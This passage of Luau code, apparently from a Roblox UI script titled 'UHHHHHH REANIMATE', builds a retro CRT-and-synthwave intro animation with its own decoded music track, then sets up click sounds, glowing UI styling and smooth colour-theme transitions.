			local n24 = va * 262144 + vb * 4096 + (vc or 0) * 64 + (vd or 0)
			n = n + 1
			if vc == nil then
				out[n] = string.char(math.floor(n24 / 65536))
			elseif vd == nil then
				out[n] = string.char(math.floor(n24 / 65536), math.floor(n24 / 256) % 256)
			else
				out[n] = string.char(math.floor(n24 / 65536), math.floor(n24 / 256) % 256, n24 % 256)
			end
		end
		return table.concat(out)
	end
	GetIntroTrackAsset = function()
		local ok, asset = pcall(function()
			if not isfile(IntroTrackFile) or #readfile(IntroTrackFile) ~= IntroTrackSize then
				writefile(IntroTrackFile, DecodeBase64(IntroTrackB64))
			end
			return getcustomasset(IntroTrackFile)
		end)
		if ok and type(asset) == "string" then
			return asset
		end
		return ""
	end
end

SaveData.SkipIntro = not not SaveData.SkipIntro
MusicPlayer.IntroHasMusic = #MusicPlayer.Database > 0
MusicPlayer.IntroStart = os.clock()
if SaveData.SkipIntro then
	MusicPlayer.PlayMusic()
else
	-- the intro plays its own retro track on a separate Sound; the UI music list is untouched
	-- and the normal UI music fades in when the intro is over (see the end of this block)
	UISound.Music.Volume = 0
	local IntroSound = Util.Instance("Sound", UIMainFrame)
	IntroSound.Name = "IntroTrack"
	IntroSound.Looped = false
	IntroSound.PlaybackRegionsEnabled = false
	IntroSound.Volume = 1
	local introasset = GetIntroTrackAsset()
	MusicPlayer.IntroHasMusic = #introasset > 0
	MusicPlayer.IntroStart = os.clock()
	if MusicPlayer.IntroHasMusic then
		IntroSound.SoundId = introasset
		local waited = 0
		repeat
			waited += RunService.RenderStepped:Wait()
		until IntroSound.IsLoaded or waited > 6
		IntroSound.TimePosition = 0
		IntroSound:Play()
		-- line the intro clock up with the real playhead so the animation hits the beats
		waited = 0
		repeat
			waited += RunService.RenderStepped:Wait()
		until IntroSound.TimePosition > 0 or waited > 1
		MusicPlayer.IntroStart = os.clock() - IntroSound.TimePosition
	else
		-- intro track could not be written: fall back to the normal UI music during the intro
		UISound.Music.Volume = 1
		task.spawn(MusicPlayer.PlayMusic)
	end
	-- ===== retro intro: CRT power-on > BIOS boot > synthwave sunset > glitch title > loading bar =====
	local IntroRoot = nil
	local IntroConn = nil
	local function RunRetroIntro()
		local BOOT_EXTRA = 1.6
		local T_END = 6.4 + BOOT_EXTRA
		local HORIZON = 0.58
		local MAGENTA = Color3.fromRGB(255, 45, 200)
		local CYAN = Color3.fromRGB(0, 235, 255)
		local YELLOW = Color3.fromRGB(255, 225, 80)
		local GREEN = Color3.fromRGB(90, 255, 120)
		local WHITE = Color3.new(1, 1, 1)
		local BLACK = Color3.new(0, 0, 0)
		local SKY_A = Color3.fromRGB(4, 0, 20)
		local SKY_B = Color3.fromRGB(40, 0, 80)
		local SKY_C = Color3.fromRGB(150, 15, 130)
		local FLOOR_TOP = Color3.fromRGB(70, 5, 100)
		local rng = Random.new()

		local function new(class, parent, props)
			local o = Util.Instance(class, parent)
			for k, v in props do
				o[k] = v
			end
			return o
		end
		local function skycolor(f)
			f = math.clamp(f, 0, 1)
			if f < 0.55 then
				return SKY_A:Lerp(SKY_B, f / 0.55)
			end
			return SKY_B:Lerp(SKY_C, (f - 0.55) / 0.45)
		end

		local scr = Util.GetScreenSize()
		local W, H = scr.X, scr.Y

		local root = new("Frame", UIMainFrame, {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundColor3 = BLACK,
			BorderSizePixel = 0,
			ClipsDescendants = true,
			ZIndex = 1,
		})
		IntroRoot = root

		-- skip with a click, tap, space or enter
		local skip = false
		IntroConn = UserInputService.InputBegan:Connect(function(input)
			local ut = input.UserInputType
			if ut == Enum.UserInputType.MouseButton1 or ut == Enum.UserInputType.Touch
				or input.KeyCode == Enum.KeyCode.Space or input.KeyCode == Enum.KeyCode.Return then
				skip = true
			end
		end)

		-- CRT power-on line
		local crt = new("Frame", root, {
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, 0.5, 0),
			Size = UDim2.new(0, 0, 0, 3),
			BackgroundColor3 = WHITE,
			BorderSizePixel = 0,
			ZIndex = 90,
		})

		-- BIOS boot text
		local boot = new("TextLabel", root, {
			BackgroundTransparency = 1,
			Position = UDim2.new(0, 24, 0, 20),
			Size = UDim2.new(0.8, 0, 0.5, 0),
			Font = Enum.Font.Arcade,
			Text = "",
			TextColor3 = GREEN,
			TextSize = 16,
			TextXAlignment = Enum.TextXAlignment.Left,
			TextYAlignment = Enum.TextYAlignment.Top,
			ZIndex = 80,
		})
		boot.TextSize = math.clamp(math.floor(H / 45), 12, 24)
		local bootlines = {
			{0.50, "UHHHHHH BIOS V" .. UhhhhhhVersion},
			{0.95, "MEMORY TEST 64K ........ OK"},
			{1.40, "RIG CHECK .............. OK"},
			{1.85, "NETWORK LINK ........... OK"},
			{2.30, "MOUNTING UHHHHHH.SYS .... OK"},
			{2.75, "LOADING REANIMATE.SYS"},
		}

		-- scene
		local scene = new("Frame", root, {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			Visible = false,
			ZIndex = 2,
		})

		-- sky
		local sky = new("Frame", scene, {
			Size = UDim2.new(1, 0, HORIZON, 0),
			BackgroundColor3 = WHITE,
			BorderSizePixel = 0,
			ClipsDescendants = true,
			ZIndex = 3,
		})
		new("UIGradient", sky, {
			Rotation = 90,
			Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, SKY_A),
				ColorSequenceKeypoint.new(0.55, SKY_B),
				ColorSequenceKeypoint.new(1, SKY_C),
			}),
		})
		local stars = {}
		for i = 1, 36 do
			local sz = rng:NextInteger(2, 3)
			stars[i] = {
				f = new("Frame", sky, {
					Position = UDim2.new(rng:NextNumber(), 0, rng:NextNumber() * 0.7, 0),
					Size = UDim2.fromOffset(sz, sz),
					BackgroundColor3 = WHITE,
					BorderSizePixel = 0,
					ZIndex = 4,
				}),
				ph = rng:NextNumber() * 6.28,
				sp = 2 + rng:NextNumber() * 3,
			}
		end
		local halo = new("Frame", sky, {
			AnchorPoint = Vector2.new(0.5, 0.5),
			BackgroundColor3 = MAGENTA,
			BackgroundTransparency = 0.86,
			BorderSizePixel = 0,
			ZIndex = 4,
		})
		new("UICorner", halo, {CornerRadius = UDim.new(0.5, 0)})
		local sun = new("Frame", sky, {
			AnchorPoint = Vector2.new(0.5, 0.5),
			BackgroundColor3 = WHITE,
			BorderSizePixel = 0,
			ZIndex = 5,
		})
		new("UICorner", sun, {CornerRadius = UDim.new(0.5, 0)})
		new("UIGradient", sun, {
			Rotation = 90,
			Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, YELLOW),
				ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 70)),
				ColorSequenceKeypoint.new(1, MAGENTA),
			}),
		})
		local slitoff = {0.08, 0.17, 0.26, 0.35, 0.43, 0.49}
		local slitth = {0.012, 0.02, 0.03, 0.04, 0.05, 0.06}
		local slits = {}
		for i = 1, 6 do
			slits[i] = new("Frame", sky, {
				AnchorPoint = Vector2.new(0.5, 0.5),
				BackgroundColor3 = SKY_B,
				BorderSizePixel = 0,
				ZIndex = 6,
			})
		end
		-- neon mountains (squares turned 45 degrees, the lower half is hidden by the horizon)
		local mountains = {{0.07, 0.20}, {0.21, 0.32}, {0.31, 0.18}, {0.69, 0.20}, {0.80, 0.34}, {0.93, 0.24}}
		for _, m in mountains do
			local s = H * m[2]
			local mt = new("Frame", sky, {
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.new(m[1], 0, 1, 0),
				Size = UDim2.fromOffset(s, s),
				Rotation = 45,
				BackgroundColor3 = Color3.fromRGB(18, 0, 38),
				BorderSizePixel = 0,
				ZIndex = 7,
			})
			new("UIStroke", mt, {
				Color = CYAN,
				Thickness = 2,
				ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
			})
		end

		-- floor with perspective grid
		local floor = new("Frame", scene, {
			Position = UDim2.new(0, 0, HORIZON, 0),
			Size = UDim2.new(1, 0, 1 - HORIZON, 0),
			BackgroundColor3 = WHITE,
			BorderSizePixel = 0,
			ClipsDescendants = true,
			ZIndex = 3,
		})
		new("UIGradient", floor, {
			Rotation = 90,
			Color = ColorSequence.new(FLOOR_TOP, Color3.fromRGB(4, 0, 12)),
		})
		local floorh = H * (1 - HORIZON)
		local NV = 9
		for k = -NV, NV do
			local pivot = new("Frame", floor, {
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.new(0.5, 0, 0, 0),
				Size = UDim2.new(0, 0, 0, 0),
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Rotation = math.deg(math.atan((k / NV) * (W * 0.75 / floorh))),
				ZIndex = 5,
			})
			new("Frame", pivot, {
				AnchorPoint = Vector2.new(0.5, 0),
				Position = UDim2.new(0, 0, 0, 0),
				Size = UDim2.new(0, 2, 0, floorh * 5),
				BackgroundColor3 = MAGENTA,
				BackgroundTransparency = 0.1,
				BorderSizePixel = 0,
				ZIndex = 5,
			})
		end
		local NH = 14
		local hlines = {}
		for i = 1, NH do
			hlines[i] = new("Frame", floor, {
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.new(0.5, 0, 0, 0),
				Size = UDim2.new(1, 0, 0, 2),
				BackgroundColor3 = MAGENTA,
				BorderSizePixel = 0,
				ZIndex = 5,
			})
		end
		local floorfade = new("Frame", floor, {
			Size = UDim2.new(1, 0, 0.3, 0),
			BackgroundColor3 = FLOOR_TOP,
			BorderSizePixel = 0,
			ZIndex = 7,
		})
		new("UIGradient", floorfade, {Rotation = 90, Transparency = NumberSequence.new(0, 1)})

		-- horizon glow + line
		local glow = new("Frame", scene, {
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, HORIZON, 0),
			Size = UDim2.new(1, 0, 0.08, 0),
			BackgroundColor3 = MAGENTA,
			BorderSizePixel = 0,
			ZIndex = 9,
		})
		new("UIGradient", glow, {
			Rotation = 90,
			Transparency = NumberSequence.new({
				NumberSequenceKeypoint.new(0, 1),
				NumberSequenceKeypoint.new(0.5, 0.25),
				NumberSequenceKeypoint.new(1, 1),
			}),
		})
		new("Frame", scene, {
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, HORIZON, 0),
			Size = UDim2.new(1, 0, 0, 2),
			BackgroundColor3 = CYAN,
			BorderSizePixel = 0,
			ZIndex = 10,
		})

		-- title + subtitle (shadow, chromatic split, main)
		local function mktext(txt, color, z)
			return new("TextLabel", scene, {
				AnchorPoint = Vector2.new(0.5, 0.5),
				BackgroundTransparency = 1,
				Font = Enum.Font.Arcade,
				Text = txt,
				TextColor3 = color,
				TextScaled = true,
				MaxVisibleGraphemes = 0,
				ZIndex = z,
			})
		end
		local function place(label, x, y, w, h, n)
			label.Position = UDim2.fromOffset(x, y)
			label.Size = UDim2.fromOffset(w, h)
			label.MaxVisibleGraphemes = n
		end
		local tShadow = mktext("UHHHHHH", Color3.fromRGB(20, 0, 40), 31)
		local tMag = mktext("UHHHHHH", WHITE, 32)
		local tCyan = mktext("UHHHHHH", WHITE, 33)
		local tMain = mktext("UHHHHHH", WHITE, 34)
		local gMag = new("UIGradient", tMag, {})
		local gCyan = new("UIGradient", tCyan, {})
		local gMain = new("UIGradient", tMain, {})
		local function setrainbow(grad, h0)
			local kps = {}
			for i = 0, 15 do
				local pos = i / 15
				kps[#kps + 1] = ColorSequenceKeypoint.new(pos, Color3.fromHSV((h0 + pos * 1.5) % 1, 0.85, 1))
			end
			grad.Color = ColorSequence.new(kps)
		end
		local sShadow = mktext("REANIMATE", Color3.fromRGB(20, 0, 40), 31)
		local sMain = mktext("REANIMATE", YELLOW, 32)
		local glitchtimes = {3.75, 4.35, 4.95, 5.5}
		local glitchbar = new("Frame", scene, {
			Size = UDim2.new(1, 0, 0, 8),
			BackgroundColor3 = WHITE,
			BackgroundTransparency = 0.65,
			BorderSizePixel = 0,
			Visible = false,
			ZIndex = 60,
		})

		-- loading bar
		local barframe = new("Frame", scene, {
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, 0.9, 0),
			Size = UDim2.new(0.5, 0, 0, 16),
			BackgroundColor3 = Color3.fromRGB(10, 0, 25),
			BorderSizePixel = 2,
			BorderColor3 = CYAN,
			ZIndex = 40,
		})
		local barfill = new("Frame", barframe, {
			Size = UDim2.new(0, 0, 1, 0),
			BackgroundColor3 = WHITE,
			BorderSizePixel = 0,
			ZIndex = 41,
		})
		new("UIGradient", barfill, {Color = ColorSequence.new(CYAN, MAGENTA)})
		for i = 1, 19 do
			new("Frame", barframe, {
				Position = UDim2.new(i / 20, -1, 0, 0),
				Size = UDim2.new(0, 2, 1, 0),
				BackgroundColor3 = Color3.fromRGB(10, 0, 25),
				BorderSizePixel = 0,
				ZIndex = 42,
			})
		end
		local labelsize = math.clamp(math.floor(H / 45), 12, 24)
		local barlabel = new("TextLabel", scene, {
			AnchorPoint = Vector2.new(0, 1),
			Position = UDim2.new(0.25, 0, 0.9, -14),
			Size = UDim2.new(0.25, 0, 0, labelsize + 4),
			BackgroundTransparency = 1,
			Font = Enum.Font.Arcade,
			Text = "LOADING",
			TextColor3 = CYAN,
			TextSize = labelsize,
			TextXAlignment = Enum.TextXAlignment.Left,
			ZIndex = 43,
		})
		local barpct = new("TextLabel", scene, {
			AnchorPoint = Vector2.new(1, 1),
			Position = UDim2.new(0.75, 0, 0.9, -14),
			Size = UDim2.new(0.25, 0, 0, labelsize + 4),
			BackgroundTransparency = 1,
			Font = Enum.Font.Arcade,
			Text = "000%",
			TextColor3 = MAGENTA,
			TextSize = labelsize,
			TextXAlignment = Enum.TextXAlignment.Right,
			ZIndex = 43,
		})
		new("TextLabel", scene, {
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, 0.965, 0),
			Size = UDim2.new(0.6, 0, 0, 18),
			BackgroundTransparency = 1,
			Font = Enum.Font.Arcade,
			Text = "UHHHHHH SOFT (C) 198X   -   V" .. UhhhhhhVersion,
			TextColor3 = WHITE,
			TextTransparency = 0.5,
			TextSize = math.clamp(math.floor(H / 70), 10, 16),
			ZIndex = 43,
		})
		new("TextLabel", scene, {
			AnchorPoint = Vector2.new(1, 0.5),
			Position = UDim2.new(0.985, 0, 0.965, 0),
			Size = UDim2.new(0.2, 0, 0, 18),
			BackgroundTransparency = 1,
			Font = Enum.Font.Arcade,
			Text = "CLICK TO SKIP",
			TextColor3 = WHITE,
			TextTransparency = 0.65,
			TextSize = math.clamp(math.floor(H / 80), 9, 14),
			TextXAlignment = Enum.TextXAlignment.Right,
			ZIndex = 43,
		})

		-- CRT overlay: scanlines, tracking band, vignette, final white-out
		local overlay = new("Frame", root, {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			ZIndex = 100,
		})
		local step = math.max(4, math.ceil(H / 200))
		for y = 0, H, step do
			new("Frame", overlay, {
				Position = UDim2.fromOffset(0, y),
				Size = UDim2.new(1, 0, 0, 1),
				BackgroundColor3 = BLACK,
				BackgroundTransparency = 0.8,
				BorderSizePixel = 0,
				ZIndex = 101,
			})
		end
		local band = new("Frame", overlay, {
			Size = UDim2.new(1, 0, 0.07, 0),
			BackgroundColor3 = WHITE,
			BorderSizePixel = 0,
			ZIndex = 102,
		})
		new("UIGradient", band, {
			Rotation = 90,
			Transparency = NumberSequence.new({
				NumberSequenceKeypoint.new(0, 1),
				NumberSequenceKeypoint.new(0.5, 0.88),
				NumberSequenceKeypoint.new(1, 1),
			}),
		})
		local function edge(pos, size, rot)
			local e = new("Frame", overlay, {
				Position = pos,
				Size = size,
				BackgroundColor3 = BLACK,
				BorderSizePixel = 0,
				ZIndex = 103,
			})
			new("UIGradient", e, {Rotation = rot, Transparency = NumberSequence.new(0.2, 1)})
		end
		edge(UDim2.new(0, 0, 0, 0), UDim2.new(1, 0, 0.2, 0), 90)
		edge(UDim2.new(0, 0, 0.8, 0), UDim2.new(1, 0, 0.2, 0), 270)
		edge(UDim2.new(0, 0, 0, 0), UDim2.new(0.14, 0, 1, 0), 0)
		edge(UDim2.new(0.86, 0, 0, 0), UDim2.new(0.14, 0, 1, 0), 180)
		local whiteout = new("Frame", root, {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundColor3 = WHITE,
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			ZIndex = 200,
		})

		while true do
			RunService.Heartbeat:Wait()
			local t = os.clock() - MusicPlayer.IntroStart
			local st = t - BOOT_EXTRA
			if t >= T_END or skip then break end
			local scr2 = Util.GetScreenSize()
			W, H = scr2.X, scr2.Y

			-- CRT turning on
			if t < 0.25 then
				crt.Size = UDim2.new(t / 0.25, 0, 0, 3)
			elseif t < 0.6 then
				local a = (t - 0.25) / 0.35
				crt.Size = UDim2.new(1, 0, a, math.floor(3 * (1 - a)))
				crt.BackgroundTransparency = a * a
			else
				crt.Visible = false
			end

			-- boot text, then the scene flickers on like an old TV
			if t < 2.25 + BOOT_EXTRA then
				local shown = {}
				for _, l in bootlines do
					local n = math.floor((t - l[1]) * 50)
					if n > 0 then
						shown[#shown + 1] = string.sub(l[2], 1, n)
					end
				end
				if #shown > 0 and math.floor(t * 4) % 2 == 0 then
					shown[#shown] = shown[#shown] .. "_"
				end
				boot.Text = table.concat(shown, "\n")
				boot.Visible = true
			else
				boot.Visible = false
			end
			if t < 1.95 + BOOT_EXTRA then
				scene.Visible = false
			elseif t < 2.25 + BOOT_EXTRA then
				scene.Visible = rng:NextNumber() > 0.45
			else
				scene.Visible = true
			end

			-- stars
			for _, s in stars do
				s.f.BackgroundTransparency = 0.15 + 0.7 * (0.5 + 0.5 * math.sin(t * s.sp + s.ph))
			end

			-- sun rising behind the horizon
			local skyH = H * HORIZON
			local d = H * 0.36
			local rise = math.clamp((st - 2.2) / 1.6, 0, 1)
			rise = 1 - (1 - rise) ^ 3
			local sunY = skyH + d * 0.6 - rise * (d * 0.75)
			sun.Position = UDim2.new(0.5, 0, 0, sunY)
			sun.Size = UDim2.fromOffset(d, d)
			halo.Position = UDim2.new(0.5, 0, 0, sunY)
			halo.Size = UDim2.fromOffset(d * 1.7, d * 1.7)
			halo.BackgroundTransparency = 0.86 + 0.04 * math.sin(t * 3)
			for i = 1, 6 do
				local cy = sunY + d * slitoff[i]
				slits[i].Position = UDim2.new(0.5, 0, 0, cy)
				slits[i].Size = UDim2.fromOffset(d * 1.04, math.max(1, d * slitth[i]))
				slits[i].BackgroundColor3 = skycolor(cy / skyH)
			end

			-- grid scrolling towards the viewer
			local phase = (math.max(st, 0) * 0.55) % 1
			for i = 1, NH do
				local u = ((i - 1) + phase) / NH
				local y = u ^ 2.3
				local line = hlines[i]
				line.Position = UDim2.new(0.5, 0, y, 0)
				line.Size = UDim2.new(1, 0, 0, 1 + math.floor(y * 4))
				line.BackgroundTransparency = 0.85 - 0.8 * math.min(1, u * 1.6)
			end

			-- title with glitch bursts
			local gs = 0
			for _, g in glitchtimes do
				if st >= g and st < g + 0.14 then
					gs = 1
				end
			end
			local dx = 2 + gs * rng:NextInteger(6, 18)
			local jx = gs * rng:NextInteger(-14, 14)
			local jy = gs * rng:NextInteger(-5, 5)
			local tw, th = W * 0.8, H * 0.17
			local tx, ty = W * 0.5 + jx, H * 0.2 + jy
			local n1 = math.floor(math.max(0, st - 3.1) * 12)
			place(tShadow, tx + 5, ty + 5, tw, th, n1)
			place(tMag, tx + dx, ty, tw, th, n1)
			place(tCyan, tx - dx, ty, tw, th, n1)
			place(tMain, tx, ty, tw, th, n1)
			local n2 = math.floor(math.max(0, st - 3.8) * 16)
			local hue = (st * 0.35) % 1
			setrainbow(gMain, hue)
			setrainbow(gMag, hue + 0.33)
			setrainbow(gCyan, hue + 0.66)
			place(sShadow, W * 0.5 + 3, H * 0.31 + 3, W * 0.8, H * 0.07, n2)
			place(sMain, W * 0.5 + jx * 0.5, H * 0.31, W * 0.8, H * 0.07, n2)
			glitchbar.Visible = gs > 0
			if gs > 0 then
				glitchbar.Position = UDim2.fromOffset(0, rng:NextInteger(0, math.floor(H)))
				glitchbar.Size = UDim2.new(1, 0, 0, rng:NextInteger(3, 26))
			end

			-- loading bar
			local p = math.clamp((st - 2.4) / 3.3, 0, 1)
			local stepped = math.floor(p * 20) / 20
			barfill.Size = UDim2.new(stepped, 0, 1, 0)
			barpct.Text = string.format("%03d%%", math.floor(stepped * 100))
			if p < 1 then
				barlabel.Text = "LOADING" .. string.rep(".", math.floor(t * 3) % 4)
			else
				barlabel.Text = math.floor(t * 6) % 2 == 0 and "SYSTEM READY" or ""
			end

			-- CRT overlay
			band.Position = UDim2.new(0, 0, (t * 0.5) % 1.4 - 0.2, 0)
			whiteout.BackgroundTransparency = 1 - math.clamp((t - (T_END - 0.3)) / 0.3, 0, 1)
		end
	end
	local introok, introerr = pcall(RunRetroIntro)
	if not introok then
		warn("[intro] " .. tostring(introerr))
	end
	if IntroConn then
		IntroConn:Disconnect()
	end
	local flash = Util.Instance("Frame", UIMainFrame)
	flash.AnchorPoint = Vector2.new(0, 0)
	flash.Position = UDim2.new(0, 0, 0, 0)
	flash.Size = UDim2.new(1, 0, 1, 0)
	flash.BackgroundColor3 = Color3.new(1, 1, 1)
	flash.BackgroundTransparency = 0
	flash.BorderSizePixel = 0
	flash.Interactable = false
	flash.ZIndex = 256
	if IntroRoot then
		IntroRoot:Destroy()
	end
	UIMainFrame.BackgroundTransparency = 1
	TweenService:Create(flash, TweenInfo.new(1), {
		BackgroundTransparency = 1
	}):Play()
	Debris:AddItem(flash, 1)
	-- intro over: crossfade from the intro track into the normal UI music
	if MusicPlayer.IntroHasMusic then
		TweenService:Create(IntroSound, TweenInfo.new(1, Enum.EasingStyle.Linear), {
			Volume = 0
		}):Play()
		Debris:AddItem(IntroSound, 1.2)
		task.spawn(function()
			MusicPlayer.PlayMusic()
			if not SaveData.MuteUIMusic then
				TweenService:Create(UISound.Music, TweenInfo.new(1, Enum.EasingStyle.Linear), {
					Volume = 1
				}):Play()
			end
		end)
	end
end

SaveData.MuteUIMusic = not not SaveData.MuteUIMusic
SaveData.MuteReanimMusic = not not SaveData.MuteReanimMusic
SaveData.MuteUISound = not not SaveData.MuteUISound

if SaveData.MuteUIMusic then
	if SaveData.SkipIntro then
		UISound.Music.Volume = 0
	else
		TweenService:Create(UISound.Music, TweenInfo.new(3, Enum.EasingStyle.Linear), {
			Volume = 0
		}):Play()
	end
end

UISound.Click = Util.Instance("Sound", UIMainFrame)
UISound.Click.SoundId = "rbxassetid://118806752369227"
UISound.Click.Volume = 1
UISound.Click.PlaybackSpeed = 1
if SaveData.MuteUISound then
	UISound.Click.Volume = 0
end

local StylizedObjs = {}
local function Stylize(obj, options)
	options = options or {}
	Util.Instance("UICorner", obj).CornerRadius = UDim.new(0, 5)
	local Out = Util.Instance("UIStroke", obj)
	Out.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	Out.Color = Color3.new(1, 1, 1)
	Out.LineJoinMode = Enum.LineJoinMode.Round
	Out.Thickness = 1
	Out.Transparency = 0
	Out.Enabled = true
	obj.BackgroundColor3 = Color3.new(0, 0, 0)
	local Glos = {}
	if options.Glow == true then
		local GloF = Util.Instance("Frame", UIMainFrame)
		Util.LinkDestroyI2I(obj, GloF)
		GloF.Interactable = false
		GloF.BackgroundTransparency = 1
		local function update()
			GloF.AnchorPoint = obj.AnchorPoint
			GloF.Position = obj.Position - Util.Vector2ToUDim2Offset((obj.AnchorPoint * 2 - Vector2.one) * 5)
			GloF.Size = obj.Size - UDim2.fromOffset(10, 10)
			GloF.Visible = obj.Visible
			GloF.ZIndex = obj.ZIndex - 2
		end
		update()
		obj.Changed:Connect(update)
		local tex = Util.GetCDNAsset("lightinursoul.graphic.png")
		for x=0, 2 do
			for y=0, 2 do
				local Glo = Util.Instance("ImageLabel", GloF)
				Glo.AnchorPoint = Vector2.new(1 - math.min(x, 1), 1 - math.min(y, 1))
				Glo.Position = UDim2.fromScale(math.max(x - 1, 0), math.max(y - 1, 0))
				Glo.Size = UDim2.new(1 - math.abs(x - 1), x == 1 and 0 or 32, 1 - math.abs(y - 1), y == 1 and 0 or 32)
				Glo.BackgroundTransparency = 1
				Glo.Image = tex
				Glo.ImageRectOffset = Vector2.new(math.min(x, 1) * 256, math.min(y, 1) * 256)
				Glo.ImageRectSize = Vector2.new(x == 1 and 0 or 256, y == 1 and 0 or 256)
				table.insert(Glos, Glo)
			end
		end
	end
	table.insert(StylizedObjs, {
		obj = obj,
		Out = Out,
		Glos = Glos,
		options = options,
	})
end
local ForceUIColor = nil
local ForceUIBGColor = nil
local _totalrendertime = 0
-- one shared easing for every window/page slide (slow start, slow stop = smooth)
local UITweenInfo = TweenInfo.new(0.55, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut)
-- state of the smooth theme transition
local UIThemeBlend = {
	Alpha = 1,
	Duration = 0.9,
	FromFore = nil,
	FromBack = nil,
	FromText = nil,
	ToText = nil,
}
local function UIBlendEase(a)
	-- smootherstep: speed and acceleration are both 0 at start and end
	return a * a * a * (a * (a * 6 - 15) + 10)
end
local function RawUIColor(force, t)
	if force then
		local si = math.sin(math.pi * 2 * t / 10)
		local h, s, v = force:ToHSV()
		if s < 0.2 then
			v *= 0.8 + si * 0.2
		else
			h += si * 0.01
		end
		return Util.LoopedHSV(h, s, v)
	end
	return Util.LoopedHSV(t / 10, 0.8, 1)
end
local function RawUIBGColor(force, t)
	if force then
		local si = math.sin(math.pi * 2 * t / 10)
		local h, s, v = force:ToHSV()
		if s < 0.2 then
			if v > 0.5 then
				v *= 0.95 + si * 0.05
			else
				v *= 1.05 + si * 0.05
			end
		else
			h += si * 0.01
		end
		return Util.LoopedHSV(h, s, v)
	end
	return Color3.new(0, 0, 0)
end
local function GetUIColor(t)
	local c = RawUIColor(ForceUIColor, t)
	if UIThemeBlend.Alpha < 1 and UIThemeBlend.FromFore then
		c = UIThemeBlend.FromFore:Lerp(c, UIBlendEase(UIThemeBlend.Alpha))
	end
	return c
end
local function GetUIBGColor(t)
	local c = RawUIBGColor(ForceUIBGColor, t)
	if UIThemeBlend.Alpha < 1 and UIThemeBlend.FromBack then
		c = UIThemeBlend.FromBack:Lerp(c, UIBlendEase(UIThemeBlend.Alpha))
	end
	return c
end
local UITextColor = Util.Instance("Color3Value")
UITextColor.Value = Color3.new(1, 1, 1)
local function RegisterTextLabel(obj)
	if obj:IsA("TextLabel") or obj:IsA("TextButton") then
		obj.TextColor3 = UITextColor.Value
		Util.LinkDestroyI2C(obj, UITextColor.Changed:Connect(function(val)
			obj.TextColor3 = val
		end))
	end
	if obj:IsA("TextBox") then
		local h, s, v = UITextColor.Value:ToHSV()
		obj.TextColor3 = UITextColor.Value
		obj.PlaceholderColor3 = Color3.fromHSV(h, s, 0.5 + (v - 0.5) * 0.4)
		Util.LinkDestroyI2C(obj, UITextColor.Changed:Connect(function(val)
			h, s, v = val:ToHSV()
			obj.TextColor3 = val
			obj.PlaceholderColor3 = Color3.fromHSV(h, s, 0.5 + (v - 0.5) * 0.4)
		end))
	end
end
local function UpdateGrads(t)
	local c = GetUIColor(t)
	local bgc = GetUIBGColor(t)
	local h, s, v = bgc:ToHSV()
	local bgcd = Color3.fromHSV(h, s, v * 0.9)
	local h2, s2, v2 = c:ToHSV()
	local glc = c
	if v > v2 then
		glc = bgc
	end
	for _,grad in StylizedObjs do
		local obj, Out, Glos, options = grad.obj, grad.Out, grad.Glos, grad.options
		Out.Color = c
		if options.Depthed then
			obj.BackgroundColor3 = bgcd
		else
			obj.BackgroundColor3 = bgc
		end
		for _,v in Glos do
			v.ImageColor3 = glc
		end
	end
end
local function StepUIThemeBlend(dt)
	local b = UIThemeBlend
	if b.Alpha >= 1 then return end
	b.Alpha = math.min(1, b.Alpha + dt / b.Duration)
	if b.FromText and b.ToText then
		if b.Alpha >= 1 then
			UITextColor.Value = b.ToText
		else
			UITextColor.Value = b.FromText:Lerp(b.ToText, UIBlendEase(b.Alpha))
		end
	end
	if b.Alpha >= 1 then
		b.FromFore, b.FromBack, b.FromText, b.ToText = nil, nil, nil, nil
	end
end
local function SetUITheme(index, instant)
	local UIThemes = {
		-- RGB/Default
		{},
		-- ALONE
		{Fore = Color3.new(1, 1, 1), SndClick = "rbxassetid://81715128969224"},
		-- Crimson
		{Fore = Color3.new(0.9, 0, 0), Back = Color3.new(0.05, 0, 0)},
	}
	local theme = {nil, nil, Color3.new(1, 1, 1), "rbxassetid://118806752369227"}
	local t = UIThemes[index] or UIThemes[1]
	if typeof(t.Fore) == "Color3" then
		theme[1] = t.Fore
	end
	if typeof(t.Back) == "Color3" then
		theme[2] = t.Back
	end
	if typeof(t.Text) == "Color3" then
		theme[3] = t.Text
	end
	if typeof(t.SndClick) == "string" then
		theme[4] = t.SndClick
	end
	if instant then
		UIThemeBlend.Alpha = 1
		UIThemeBlend.FromFore, UIThemeBlend.FromBack, UIThemeBlend.FromText, UIThemeBlend.ToText = nil, nil, nil, nil
		UITextColor.Value = theme[3]
	else
		-- remember what is on screen right now and fade from it to the new theme
		local now = _totalrendertime
		UIThemeBlend.FromFore = GetUIColor(now)
		UIThemeBlend.FromBack = GetUIBGColor(now)
		UIThemeBlend.FromText = UITextColor.Value
		UIThemeBlend.ToText = theme[3]
		UIThemeBlend.Alpha = 0
	end
	ForceUIColor = theme[1]
	ForceUIBGColor = theme[2]
	UISound.Click.SoundId = theme[4]
end
-- the theme list now only has RGB, ALONE and Crimson, so convert old saved indexes
if SaveData.UIThemeVersion ~= 2 then
	local oldtonew = {[1] = 1, [2] = 2, [6] = 3}
	SaveData.UITheme = oldtonew[SaveData.UITheme or 1] or 1
	SaveData.UIThemeVersion = 2
